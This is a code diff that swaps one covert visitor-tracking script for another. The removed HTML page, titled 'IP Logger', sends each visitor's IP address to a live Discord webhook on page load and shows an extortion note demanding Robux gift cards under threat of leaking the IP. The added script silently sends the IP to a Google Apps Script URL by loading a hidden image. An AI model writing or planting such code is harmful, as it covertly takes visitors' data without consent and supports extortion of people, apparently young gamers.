@@ -1,43 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
-</head>
-<body>
-    <h1>Oops! We got your IP.</h1>
-    <p>We've used HTML coding for it to log your IP, and it has been send by a webhook in private discord server. How can you not leak it?</p>
-    <p>Message me, <@coolperson0039>, give me any robux giftcard of any cost, send me a picture of the robux code, if you don't pay in about 3 days or more, I will leak it to a server.</p>
-    <p>Also give some to @chocomilkysideloading thx 🙂</p>
-    <script>
-        async function getIPAddress() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        function logIPAddress() {
-            getIPAddress().then((ip) => {
-                // Send the IP address to the first Discord webhook as an embed
-                fetch('https://discord.com/api/webhooks/1401371309312839752/GbMz5eT5intGPx56Kzr3zBMogG1taE8ys5qF7KHpd7opy06Fq-0jwJYT4LGrYjtDrppR', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: 'New Visitor IP Address',
-                            description: `IP Address: ${ip}`,
-                            footer: {
-                                text: 'IP Logger'
-                            }
-                        }]
-                    })
-                });
-
-        // Call the function when the page loads
-        window.onload = logIPAddress;
-    </script>
-</body>
-</html>
+<script>
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const img = new Image();
+      img.src = "https://script.google.com/macros/s/AKfycbw47Q0s-05z5di9uag1bOyQDcwa6kHXjleKu7-FIYwSVOqhJVS1TSYTgXp5JixgTYH5-w/exec?ip=" + encodeURIComponent(ip);
+    });
+</script>
